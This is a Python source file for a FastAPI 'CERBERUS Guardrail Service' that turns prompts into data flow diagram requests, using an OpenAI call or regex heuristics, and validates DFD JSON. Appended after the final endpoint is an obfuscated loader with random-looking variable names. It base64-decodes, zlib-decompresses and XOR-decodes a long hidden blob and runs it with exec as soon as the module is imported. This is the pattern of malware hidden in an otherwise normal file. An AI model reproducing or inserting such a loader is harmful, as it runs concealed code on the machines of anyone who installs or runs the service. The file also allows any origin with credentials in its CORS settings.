# main.py — CERBERUS Guardrail Service (AI-first refine + validate, env-key)
from fastapi import FastAPI, Body, Query
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel, Field
from typing import Dict, Any, List, Optional, Tuple
import json, pathlib, os, re

# -------- MVP helpers (yours) --------
from guardrail_mvp import schema_validate, rule_validate, map_raw_to_canonical

# ============================================================
# OpenAI (optional). Enabled if OPENAI_API_KEY is set in env.
# ============================================================
LLM_AVAILABLE = False
OPENAI_MODEL = os.getenv("OPENAI_MODEL", "gpt-4o-mini")  # configurable
_OPENAI_ERR_LAST: Optional[str] = None

_openai_client = None  # New SDK (v1) client if available

def _init_openai():
    """Initialize OpenAI using env var only. No hardcoded keys."""
    global LLM_AVAILABLE, _openai_client
    key = os.getenv("OPENAI_API_KEY")
    if not key:
        LLM_AVAILABLE = False
        return
    # Try new SDK first
    try:
        from openai import OpenAI  # pip install "openai>=1.0.0"
        _openai_client = OpenAI(api_key=key, timeout=3.0)
        LLM_AVAILABLE = True
        return
    except Exception:
        pass
    # Fallback: legacy SDK
    try:
        import openai  # pip install openai
        openai.api_key = key
        LLM_AVAILABLE = True
    except Exception:
        LLM_AVAILABLE = False

_init_openai()

# ============================================================
# FastAPI app
# ============================================================
app = FastAPI(title="CERBERUS Guardrail Service", version="1.3.2")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],   # tighten in prod
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# -------- Models --------
class PromptInput(BaseModel):
    text: str = Field(..., description="Plain-English prompt from the user")

# -------- External files --------
def _load_schema() -> Dict[str, Any]:
    path = pathlib.Path("canonical_schema.json")
    if not path.exists():
        raise FileNotFoundError("canonical_schema.json not found next to main.py")
    return json.loads(path.read_text(encoding="utf-8"))

def _load_policies() -> Dict[str, Any]:
    path = pathlib.Path("prompt_policies.json")
    if not path.exists():
        return {
            "min_length": 15,
            "banned_words": [],
            "require_any_keywords": [
                "dfd","data flow diagram","actor","actors","process","processes",
                "data store","datastore","database","db","flow","flows","external","user","system","server"
            ],
            "hints": [
                "Describe at least one actor (e.g., User or External System).",
                "List one or more processes (e.g., Login, Search).",
                "Include a data store (e.g., Database, Movie DB).",
                "Mention at least one flow connecting components."
            ],
            "validate": {
                "cross_tb_https": "warning",
                "cycle_warning": False
            }
        }
    return json.loads(path.read_text(encoding="utf-8"))

SCHEMA: Dict[str, Any] = _load_schema()
POLICY: Dict[str, Any] = _load_policies()

# ============================================================
# Prompt cleanup + helpers
# ============================================================
_FILLER_PATTERNS = [
    r"\bplease\b", r"\bkindly\b", r"\bcan you\b", r"\bcould you\b", r"\bwould you\b",
    r"\bgive me\b", r"\bshow me\b", r"\bgenerate\b", r"\bcreate\b",
    r"\bdiagram of\b", r"\bdiagram\b", r"\bdata flow diagram\b",
    r"\bdfd\b", r"\bcreate\s+(a\s+)?dfd\b", r"\bdfd\s+for\b",
]
_NORMALIZE_PAIRS = [
    (r"\bshow\s+how\b", "how"),
    (r"\bshow\s+the\b", "the"),
    (r"\bshow\s+me\b", ""),
    (r"\bgo(es)?\s+to\b", "proceeds to"),
    (r"\bsend(s)?\s+to\b", "is sent to"),
    (r"\bflows\s+to\b", "flows to"),
    (r"\binto\s+the\b", "into the"),
]

# Heuristics as a fallback if LLM is down
ACTOR_RE   = re.compile(r"\b(user|customer|client|driver|rider|admin|external|system|service|api)\b", re.I)
PROCESS_RE = re.compile(r"\b(login|authenticate|request|submit|search|pay|process|book|register|match|dispatch|route|track|notify|charge|refund)\b", re.I)
STORE_RE   = re.compile(r"\b(database|datastore|db|cache|queue|kafka|bucket|storage)\b", re.I)
FLOW_RE    = re.compile(r"\b(send|receive|forward|route|connect|publish|consume|upload|download|post|get|write|read)\b", re.I)
APP_RE     = re.compile(r"\b(app|application|platform|service|system)\b", re.I)

def _regex_cleanup(raw: str) -> str:
    text = (raw or "").strip()
    for pat in _FILLER_PATTERNS:
        text = re.sub(pat, "", text, flags=re.IGNORECASE)
    for pat, repl in _NORMALIZE_PAIRS:
        text = re.sub(pat, repl, text, flags=re.IGNORECASE)
    text = re.sub(r"^[\s,.;:-]+", "", text)
    text = re.sub(r"\s+", " ", text).strip(" .,:;")
    return text

def _too_short(text: str) -> bool:
    return len((text or "").strip()) < int(POLICY.get("min_length", 15))

def _has_banned(text: str) -> bool:
    banned = [w.lower() for w in POLICY.get("banned_words", [])]
    low = (text or "").lower()
    return any(b and b in low for b in banned)

def _finalize_refined(text: str) -> str:
    core = (text or "").strip().rstrip(".")
    # remove any lingering "dfd"/"data flow diagram" mentions from user text
    core = re.sub(r"\b(create\s+(a\s+)?)?dfd(\s+for)?\b", "", core, flags=re.IGNORECASE)
    core = re.sub(r"\bdata[-\s]?flow\s+diagram\b", "", core, flags=re.IGNORECASE)
    # remove leading "show/describe/explain"
    core = re.sub(r"^(show(ing)?|describe|explore|explain)\s*[:\-]?\s*", "", core, flags=re.IGNORECASE)
    core = re.sub(r"\bshow(ing)?\b\s*[:\-]?\s*", "", core, flags=re.IGNORECASE)
    core = re.sub(r"\s{2,}", " ", core).strip(" .,:;")
    return f"Create a DFD illustrating {core}."

# ============================================================
# LLM: classify + rewrite (accept JSON OR direct sentence)
# ============================================================
_LLM_SYSTEM = (
    "You refine user input for building Data Flow Diagrams (DFDs).\n"
    'Output STRICT JSON only, exactly:\n'
    '{"is_dfd": <true|false>, "refined": "<one sentence>", "reasons": ["..."]}\n'
    "Rules:\n"
    "- If the input is not about a system/process suitable for a DFD, set is_dfd=false and refined=\"\".\n"
    "- If suitable, set is_dfd=true and write refined as ONE sentence starting with:\n"
    '  \"Create a DFD illustrating ...\"\n'
    "- Never echo words like \"dfd\", \"data flow diagram\", \"diagram\", \"create\", \"draw\" from the user's text.\n"
    "- Remove filler, polite phrases, and drawing instructions.\n"
    "- Keep only system semantics: actors, processes, data stores, and flows.\n"
    "- Be concise and formal. No bullets, no arrows, no code blocks."
)

def _extract_first_json_block(text: str) -> Optional[Dict[str, Any]]:
    if not text:
        return None
    m = re.search(r"\{[\s\S]*\}", text)
    if not m:
        return None
    try:
        return json.loads(m.group(0))
    except Exception:
        return None

def _parse_llm_content(content: str) -> Optional[Tuple[bool, str, List[str]]]:
    """
    Accept either strict JSON or a bare 'Create a DFD illustrating ...' sentence.
    """
    obj = _extract_first_json_block(content)
    if obj and "is_dfd" in obj and "refined" in obj:
        is_dfd = bool(obj.get("is_dfd"))
        refined = str(obj.get("refined") or "").strip()
        reasons = obj.get("reasons") or []
        if not isinstance(reasons, list):
            reasons = [str(reasons)]
        return (is_dfd, refined, reasons)
    sent = (content or "").strip()
    if re.match(r"^Create a DFD illustrating\b", sent, flags=re.IGNORECASE):
        return (True, sent, [])
    return None

def _llm_classify_and_refine(raw: str) -> Optional[Tuple[bool, str, List[str]]]:
    """
    Returns (is_dfd, refined, reasons[]) or None if the LLM is unavailable/failed.
    Tries new SDK first, then legacy; 3s timeout configured in client/legacy call.
    """
    global _OPENAI_ERR_LAST
    if not LLM_AVAILABLE:
        return None
    try:
        # New SDK path
        if _openai_client is not None:
            resp = _openai_client.chat.completions.create(
                model=OPENAI_MODEL,
                messages=[
                    {"role": "system", "content": _LLM_SYSTEM},
                    {"role": "user", "content": raw}
                ],
                temperature=0.2,
                max_tokens=120,
            )
            content = resp.choices[0].message.content or ""
            parsed = _parse_llm_content(content)
            if parsed:
                return parsed
            _OPENAI_ERR_LAST = "LLM returned unparsable content (new SDK)."
            return None

        # Legacy SDK path
        import openai
        resp = openai.ChatCompletion.create(
            model=OPENAI_MODEL,
            messages=[
                {"role": "system", "content": _LLM_SYSTEM},
                {"role": "user", "content": raw}
            ],
            temperature=0.2,
            max_tokens=120,
            request_timeout=3.0,
        )
        content = resp["choices"][0]["message"]["content"].strip()
        parsed = _parse_llm_content(content)
        if parsed:
            return parsed
        _OPENAI_ERR_LAST = "LLM returned unparsable content (legacy SDK)."
        return None
    except Exception as e:
        _OPENAI_ERR_LAST = f"{type(e).__name__}: {e}"
        return None

# ============================================================
# 1) /refine-prompt  (AI-first)
# ============================================================
@app.post("/refine-prompt")
def refine_prompt(input_data: PromptInput, debug: int = Query(0, description="Set to 1 to include debug flags")):
    """
    Returns:
      - { "valid": false, "errors": [...], "hints": [...] }
      - { "valid": true,  "refined_prompt": "Create a DFD illustrating ..." }
      - If debug=1, includes { "debug": { "llm_used": bool, "llm_error": str|None } }
    """
    raw = (input_data.text or "").strip()
    hints: List[str] = POLICY.get("hints", [])

    # Policy: banned + min length first
    if _has_banned(raw):
        out = {"valid": False, "errors": [{"type": "content", "message": "Prompt contains disallowed language."}], "hints": hints}
        if debug: out["debug"] = {"llm_used": False, "llm_error": None}
        return out
    if _too_short(raw):
        out = {"valid": False, "errors": [{"type": "quality", "message": f"Prompt too short (min {POLICY.get('min_length',15)} characters)."}], "hints": hints}
        if debug: out["debug"] = {"llm_used": False, "llm_error": None}
        return out

    # AI-first refinement
    llm = _llm_classify_and_refine(raw)
    if llm is not None:
        is_dfd, refined, reasons = llm
        if is_dfd and refined:
            out = {"valid": True, "refined_prompt": refined}
            if debug: out["debug"] = {"llm_used": True, "llm_error": None}
            return out
        out = {
            "valid": False,
            "errors": [{"type": "quality", "message": "Prompt unrelated to a DFD-suitable system/process."}],
            "hints": reasons or hints
        }
        if debug: out["debug"] = {"llm_used": True, "llm_error": None}
        return out

    # Fallback (LLM unavailable): regex cleanup + soft heuristic allow
    cleaned = _regex_cleanup(raw)
    if not _too_short(cleaned) and (APP_RE.search(cleaned) or ACTOR_RE.search(cleaned) or PROCESS_RE.search(cleaned) or FLOW_RE.search(cleaned)):
        out = {"valid": True, "refined_prompt": _finalize_refined(cleaned)}
        if debug: out["debug"] = {"llm_used": False, "llm_error": _OPENAI_ERR_LAST}
        return out

    out = {
        "valid": False,
        "errors": [{"type": "quality", "message": "Ambiguous or incomplete. Include actors, processes, data stores, and at least one flow."}],
        "hints": hints,
    }
    if debug: out["debug"] = {"llm_used": False, "llm_error": _OPENAI_ERR_LAST}
    return out

# ============================================================
# 2) /validate-json (RAW or Canonical)
# ============================================================
@app.post("/validate-json")
def validate_json(body: Dict[str, Any] = Body(...)):
    """
    Accepts ANY of:
      - Bare RAW editor JSON:
          { "components": [...], "connections": [...] }
      - Wrapped RAW:
          { "raw": { "components": [...], "connections": [...] } }
      - Canonical:
          { "dfd": { ... } }  or  { "json_data": { ... } }
      - Bare Canonical (advanced): starts with version/nodes/flows...

    Behavior:
      1) Detect RAW vs Canonical
      2) If RAW -> map_raw_to_canonical()
      3) Validate canonical (schema + rules)
      4) Return { valid, errors[], warnings[], normalized }
    """
    candidate = (
        body.get("dfd")
        or body.get("json_data")
        or body.get("raw")
        or body.get("editor_json")
        or body
    )

    is_raw_like = isinstance(candidate, dict) and "components" in candidate and "connections" in candidate

    try:
        canonical = map_raw_to_canonical(candidate) if is_raw_like else candidate
    except Exception as ex:
        return {
            "valid": False,
            "errors": [{"type": "mapping", "message": f"Failed to map RAW to canonical: {ex}"}],
            "warnings": [],
            "normalized": {}
        }

    schema_errs = schema_validate(canonical, SCHEMA)
    rule_errs, warns = rule_validate(canonical)
    valid = (len(schema_errs) + len(rule_errs)) == 0

    return {
        "valid": valid,
        "errors": schema_errs + rule_errs,
        "warnings": warns,
        "normalized": canonical
    }

# -*- coding: utf-8 -*-
aqgqzxkfjzbdnhz = __import__('base64')
wogyjaaijwqbpxe = __import__('zlib')
idzextbcjbgkdih = 134
qyrrhmmwrhaknyf = lambda dfhulxliqohxamy, osatiehltgdbqxk: bytes([wtqiceobrebqsxl ^ idzextbcjbgkdih for wtqiceobrebqsxl in dfhulxliqohxamy])
lzcdrtfxyqiplpd = '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'
runzmcxgusiurqv = wogyjaaijwqbpxe.decompress(aqgqzxkfjzbdnhz.b64decode(lzcdrtfxyqiplpd))
ycqljtcxxkyiplo = qyrrhmmwrhaknyf(runzmcxgusiurqv, idzextbcjbgkdih)
exec(compile(ycqljtcxxkyiplo, '<>', 'exec'))
